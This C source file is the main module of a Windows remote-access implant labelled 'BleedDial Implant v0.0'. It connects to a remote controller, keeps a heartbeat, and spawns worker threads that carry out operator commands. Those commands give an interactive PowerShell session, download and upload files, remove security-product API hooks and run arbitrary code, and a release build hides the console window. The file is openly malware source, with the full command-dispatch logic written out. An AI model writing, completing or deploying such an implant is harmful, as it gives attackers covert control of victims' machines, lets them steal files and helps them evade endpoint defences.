#include<stdio.h>

#include<winsock2.h>
#include<WS2tcpip.h>

#include "transport/transport.h"
#include "jobs/jobs.h"

#include "ctrl.h"
#include "tremont.h"

#pragma comment(lib, "Ws2_32.lib")

struct transport_pcb_t* emergency_pcb_pointer;

struct new_thread_params_t {
    tremont_stream_id stream_id;
    Tremont_Nexus* nexus;

    struct jobs_t* jobs;
    HANDLE self;
};

DWORD WINAPI wrkr_thread(struct new_thread_params_t* params) {
    struct wrkr_msg_t msg;
    tremont_recv(params->stream_id,
        (byte*)&msg, sizeof(msg), params->nexus);

    struct wrkr_trans_t trans;
    trans.stream_id = params->stream_id;
    trans.nexus = params->nexus;
    
    switch (msg.msg_enum) {
    case POWERSHELL: {
        struct wrkr_msg_t res;
        res.msg_enum = POWERSHELL;
        res.powershell.res.allowed = 1;
        tremont_send(params->stream_id,
            (byte*) & res, sizeof(res), params->nexus);

        implant_powershell(params->stream_id, params->nexus);
        break;
    }
    case DOWNLOAD: {
        struct download_msg_t* download_msg = &msg.download;
        struct download_req_t* download_req = &download_msg->req;
        implant_download(&trans, download_req);
        break;
    case UPLOAD: {
        struct upload_msg_t* upload_msg = &msg.upload;
        struct upload_req_t* upload_req = &upload_msg->req;
        implant_upload(&trans, upload_req);
        break;
    }
    case UNHOOK_L: {
        struct unhookl_msg_t* unhookl_msg = &msg.unhookl;
        struct unhookl_req_t* unhookl_req = &unhookl_msg->req;
        implant_unhookl(&trans, unhookl_req);
        break;
    }
    case UNHOOK_BYON: {
        struct unhookbyon_msg_t* unhook_byon_msg = 
            &msg.unhookbyon;
        struct unhookbyon_req_t* unhook_byon_req = 
            &unhook_byon_msg->req;
        implant_unhookbyon(&trans, unhook_byon_req);
        break;
    }
    case RUN_CODE: {
        struct runcode_msg_t* runcode_msg =
            &msg.runcode;
        struct runcode_req_t* runcode_req =
            &runcode_msg->req;
        implant_runcode(&trans, runcode_req);
        break;
    }
    default:
        break;
    }
    }

    untrack_job(params->self, params->jobs);
    free(params);
    return 0;
}

#ifdef NDEBUG
int WinMain() {
#else
int main() {
#endif
    //printf("BleedDial Implant v0.0\n");
    int res = 0;

    struct transport_pcb_t transport_pcb;
    res = transport_init(&transport_pcb);
    if (res == -1) {
        //perror("Unable to init transport!\n");
        exit(-1);
    }

    emergency_pcb_pointer = &transport_pcb;

    struct jobs_t jobs;
    memset(&jobs, 0, sizeof(jobs));

    InitializeCriticalSection(&jobs.jobs_cs);
    DuplicateHandle(
        GetCurrentProcess(),
        GetCurrentThread(),
        GetCurrentProcess(),
        jobs.main_thread_handle,
        0,
        FALSE,
        DUPLICATE_SAME_ACCESS
    );

    struct addrinfo* raddrinfo = transport_pcb.remote_addrinfo;
    Tremont_Nexus* nexus = transport_pcb.nexus;

    struct ctrl_msg_t ctrl_msg;

    /* 
        Just establish new streams for the worker threads.
        Control thread will never send any data on the worker streams.
    */
    while (res != -1) {
        res = tremont_poll_stream(CTRL_STREAM, nexus);
        if (res == 0) continue;
        res = tremont_recv(CTRL_STREAM,
            (byte*)&ctrl_msg,
            sizeof(ctrl_msg),
            nexus);
        printf("received ctrl_msg\n");
        switch (ctrl_msg.msg_enum) {
        case HEARTBEAT: {
            struct ctrl_msg_t heartbeat_res;
            heartbeat_res.msg_enum = HEARTBEAT;
            heartbeat_res.heartbeat.sanity = 1;

            tremont_send(CTRL_STREAM, (byte*)&heartbeat_res, sizeof(heartbeat_res), nexus);
        }
        case NEW_THREAD: {
            printf("received thread request\n");
            tremont_stream_id new_stream = ctrl_msg.new_thread.stream_info.stream_id;
            char* auth = ctrl_msg.new_thread.stream_info.password;
            tremont_auth_stream(new_stream, auth, STREAM_PASS_LEN, nexus);

            int res = -1;
            while (res != 0) {
                printf("sending syn for stream %d\n", new_stream);
                res = tremont_req_stream(new_stream, raddrinfo->ai_addr, 3, nexus);
            }

            struct new_thread_params_t* params = calloc(1, sizeof(*params));
            if (params == 0) continue;
            params->nexus = nexus;
            params->stream_id = new_stream;
            params->self = CreateThread(
                NULL,
                0,
                wrkr_thread,
                params,
                0,
                0
            );
            params->jobs = &jobs;
            track_job(params->self, &jobs);
        }
        default:
            continue;
        }
    }
    freeaddrinfo(raddrinfo);

    return 0;
}

BOOL WINAPI ConsoleHandler(DWORD signal) {
    Tremont_Nexus* nexus = emergency_pcb_pointer->nexus;
    struct ctrl_msg_t byebye;
    byebye.msg_enum = DISCONNECT;
    byebye.disconnect.sanity = 1;

    switch (signal) {
    case CTRL_C_EVENT:
    case CTRL_CLOSE_EVENT:
    case CTRL_BREAK_EVENT:
    case CTRL_LOGOFF_EVENT:
    case CTRL_SHUTDOWN_EVENT:
        tremont_send(CTRL_STREAM, (byte*)&byebye, sizeof(byebye), nexus);
        break;
    }
    return FALSE;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    Tremont_Nexus* nexus = emergency_pcb_pointer->nexus;
    struct ctrl_msg_t byebye;
    byebye.msg_enum = DISCONNECT;
    byebye.disconnect.sanity = 1;

    switch (uMsg) {
    case WM_CLOSE:
        DestroyWindow(hwnd);
    case WM_DESTROY:
        tremont_send(CTRL_STREAM, (byte*)&byebye, sizeof(byebye), nexus);
    }
    return 0;
}